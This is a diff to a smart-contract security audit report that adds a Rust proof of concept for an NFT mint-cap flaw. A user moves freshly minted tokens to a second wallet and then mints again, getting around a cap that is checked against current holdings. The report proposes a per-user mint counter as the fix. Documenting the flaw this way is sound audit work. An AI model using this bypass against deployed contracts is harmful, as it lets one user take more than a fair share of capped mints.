@@ -345,7 +345,30 @@ counter for user everytime they mint, and use this
 to check the mint cap.
 
 ### Proof of concept
+See `exploit_mint_query_flaw()` in integration tests.
 
 ```rust
-// code goes here
+// User can transfer the 3 NFTs just minted to another wallet
+for token in tokens.tokens {
+    app.execute_contract(
+        Addr::unchecked(USER1),
+        nft_contract.clone(),
+        &cw721::Cw721ExecuteMsg::TransferNft {
+            recipient: USER1_ALT_WALLET.to_string(),
+            token_id: token,
+        },
+        &[],
+    )
+    .unwrap();
+}
+// USER1 now can mint even more  
+for _ in 0..3 {
+    app.execute_contract(
+        Addr::unchecked(USER1),
+        contract_addr.clone(),
+        &ExecuteMsg::Mint {},
+        &[],
+    )
+    .unwrap();
+}
 ```
